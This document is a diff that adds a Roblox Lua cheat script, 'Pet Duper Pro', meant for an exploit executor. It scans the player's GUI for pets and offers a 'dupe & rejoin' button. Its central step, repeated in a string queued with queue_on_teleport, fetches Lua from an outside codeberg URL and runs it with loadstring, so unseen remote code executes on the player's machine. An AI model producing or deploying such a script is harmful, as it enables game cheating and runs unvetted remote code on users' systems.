@@ -1,0 +1,232 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+
+-- CONFIGURATION
+local config = {
+    spawnerURL = "https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua",
+    rejoinDelay = 1,      -- Minimal delay before rejoin
+    loadWaitTime = 1,     -- Minimal wait after rejoining
+    retryInterval = 1,    -- Minimal seconds between retries
+    maxRetries = 1        -- Only one spawn attempt
+}
+
+-- AUTO-EXECUTE VERIFICATION SYSTEM
+if _G.PetDuper_Executing then
+    -- Immediately execute the dupe without any GUI
+    task.spawn(function()
+        -- Minimal wait for game to load
+        task.wait(config.loadWaitTime)
+        
+        -- Try loading spawner once
+        local success, spawner = pcall(function()
+            return loadstring(game:HttpGet(_G.PetDuper_Config.spawnerURL))()
+        end)
+        
+        if success and spawner then
+            -- Execute the dupe
+            pcall(function()
+                spawner.SpawnPet(
+                    _G.PetDuper_Config.petName,
+                    _G.PetDuper_Config.petKG,
+                    _G.PetDuper_Config.petAge
+                )
+            end)
+        end
+    end)
+    return
+end
+
+-- PET SCANNING FUNCTION
+local function scanPets()
+    local pets = {}
+    
+    for _, child in ipairs(PlayerGui:GetDescendants()) do
+        if (child:IsA("TextLabel") or child:IsA("TextButton")) and child.Text ~= "" then
+            -- Match formats: "Pet [1.23 KG] [Age 1]" or "Pet (1.23 KG) (Age 1)"
+            local name, kg, age = child.Text:match("([%w%s]+)%s*[%[%(]%s*(%d+%.?%d*)%s*KG%s*[%]%)]%s*[%[%(]%s*Age%s*(%d+)%s*[%]%)]")
+            if name then
+                table.insert(pets, {
+                    name = name:gsub("^%s*(.-)%s*$", "%1"),
+                    kg = tonumber(kg),
+                    age = tonumber(age),
+                    displayText = string.format("%s (%.2fkg, Age %d)", name, kg, age)
+                })
+            end
+        end
+    end
+    
+    return pets
+end
+
+-- MAIN GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "PetDuperPro"
+gui.ResetOnSpawn = false
+gui.Parent = PlayerGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 250, 0, 300)
+mainFrame.Position = UDim2.new(0.5, -125, 0.5, -150)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = gui
+
+local title = Instance.new("TextLabel")
+title.Text = "PET DUPER PRO"
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.SourceSansBold
+title.Parent = mainFrame
+
+local petsFrame = Instance.new("ScrollingFrame")
+petsFrame.Size = UDim2.new(0.9, 0, 0, 160)
+petsFrame.Position = UDim2.new(0.05, 0, 0.18, 0)
+petsFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+petsFrame.ScrollBarThickness = 8
+petsFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+petsFrame.Parent = mainFrame
+
+local selectedLabel = Instance.new("TextLabel")
+selectedLabel.Text = "No pet selected"
+selectedLabel.Size = UDim2.new(0.9, 0, 0, 25)
+selectedLabel.Position = UDim2.new(0.05, 0, 0.65, 0)
+selectedLabel.BackgroundTransparency = 1
+selectedLabel.TextColor3 = Color3.new(1, 1, 1)
+selectedLabel.Parent = mainFrame
+
+local scanBtn = Instance.new("TextButton")
+scanBtn.Text = "SCAN PETS"
+scanBtn.Size = UDim2.new(0.45, 0, 0, 30)
+scanBtn.Position = UDim2.new(0.05, 0, 0.73, 0)
+scanBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 150)
+scanBtn.TextColor3 = Color3.new(1, 1, 1)
+scanBtn.Font = Enum.Font.SourceSansBold
+scanBtn.Parent = mainFrame
+
+local dupeBtn = Instance.new("TextButton")
+dupeBtn.Text = "DUPE & REJOIN"
+dupeBtn.Size = UDim2.new(0.45, 0, 0, 30)
+dupeBtn.Position = UDim2.new(0.5, 0, 0.73, 0)
+dupeBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 0)
+dupeBtn.TextColor3 = Color3.new(1, 1, 1)
+dupeBtn.Font = Enum.Font.SourceSansBold
+dupeBtn.Parent = mainFrame
+
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Text = "Status: Ready"
+statusLabel.Size = UDim2.new(0.9, 0, 0, 20)
+statusLabel.Position = UDim2.new(0.05, 0, 0.85, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.TextColor3 = Color3.new(1, 1, 1)
+statusLabel.Parent = mainFrame
+
+-- PET SELECTION
+local selectedPet = nil
+
+local function updatePetList()
+    petsFrame:ClearAllChildren()
+    local pets = scanPets()
+    
+    if #pets == 0 then
+        local label = Instance.new("TextLabel")
+        label.Text = "No pets found. Open your inventory!"
+        label.Size = UDim2.new(1, 0, 0, 30)
+        label.TextColor3 = Color3.new(1, 1, 1)
+        label.Parent = petsFrame
+        selectedLabel.Text = "No pets detected"
+        return
+    end
+    
+    for i, pet in ipairs(pets) do
+        local btn = Instance.new("TextButton")
+        btn.Text = pet.displayText
+        btn.Size = UDim2.new(1, -10, 0, 30)
+        btn.Position = UDim2.new(0, 5, 0, (i-1)*35)
+        btn.BackgroundColor3 = i%2 == 0 and Color3.fromRGB(40,40,40) or Color3.fromRGB(50,50,50)
+        btn.TextColor3 = Color3.new(1,1,1)
+        btn.Font = Enum.Font.SourceSans
+        btn.TextXAlignment = Enum.TextXAlignment.Left
+        
+        btn.MouseButton1Click:Connect(function()
+            selectedPet = pet
+            selectedLabel.Text = "Selected: "..pet.name
+            dupeBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+            statusLabel.Text = "Status: Ready to dupe"
+        end)
+        
+        btn.Parent = petsFrame
+    end
+    
+    statusLabel.Text = string.format("Status: Found %d pets", #pets)
+end
+
+-- SCAN BUTTON
+scanBtn.MouseButton1Click:Connect(function()
+    statusLabel.Text = "Status: Scanning..."
+    task.wait(0.5)
+    updatePetList()
+end)
+
+-- DUPE & REJOIN FUNCTION
+dupeBtn.MouseButton1Click:Connect(function()
+    if not selectedPet then
+        statusLabel.Text = "Status: Select a pet first!"
+        task.wait(1)
+        statusLabel.Text = "Status: Ready"
+        return
+    end
+    
+    -- Prepare data for rejoin
+    _G.PetDuper_Executing = true
+    _G.PetDuper_Config = {
+        petName = selectedPet.name,
+        petKG = selectedPet.kg,
+        petAge = selectedPet.age,
+        spawnerURL = config.spawnerURL
+    }
+    
+    -- Minimal teleport script
+    local teleportScript = string.format([[
+        _G.PetDuper_Executing = true
+        _G.PetDuper_Config = {
+            petName = "%s",
+            petKG = %f,
+            petAge = %d,
+            spawnerURL = "%s"
+        }
+        
+        task.wait(1) -- Minimal wait
+        
+        local success, spawner = pcall(function()
+            return loadstring(game:HttpGet(_G.PetDuper_Config.spawnerURL))()
+        end)
+        
+        if success and spawner then
+            pcall(function()
+                spawner.SpawnPet(
+                    _G.PetDuper_Config.petName,
+                    _G.PetDuper_Config.petKG,
+                    _G.PetDuper_Config.petAge
+                )
+            end)
+        end
+    ]], 
+    selectedPet.name, selectedPet.kg, selectedPet.age, config.spawnerURL)
+    
+    queue_on_teleport(teleportScript)
+    
+    -- Immediate rejoin with minimal delay
+    statusLabel.Text = "Status: Rejoining..."
+    dupeBtn.Text = "REJOINING..."
+    
+    task.wait(config.rejoinDelay)
+    TeleportService:Teleport(game.PlaceId, LocalPlayer)
+end)
+
+-- Initial scan
+updatePetList()
